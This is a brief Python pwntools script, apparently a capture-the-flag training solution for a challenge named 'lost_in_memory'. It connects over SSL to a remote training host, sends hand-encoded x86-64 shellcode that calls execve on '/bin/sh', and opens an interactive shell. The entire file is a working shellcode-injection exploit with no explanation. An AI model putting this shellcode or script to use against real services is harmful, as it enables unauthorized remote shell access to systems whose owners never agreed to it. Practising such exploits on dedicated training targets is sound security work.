from pwn import *

#c = process("./lost_in_memory")

c = remote("lost-in-memory.training.offensivedefensive.it", 8080, ssl=True)

#gdb.attach(c, """""")

c.sendline(b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x54\x5F\x0F\x05")

#0068732f6e69622f
c.interactive()

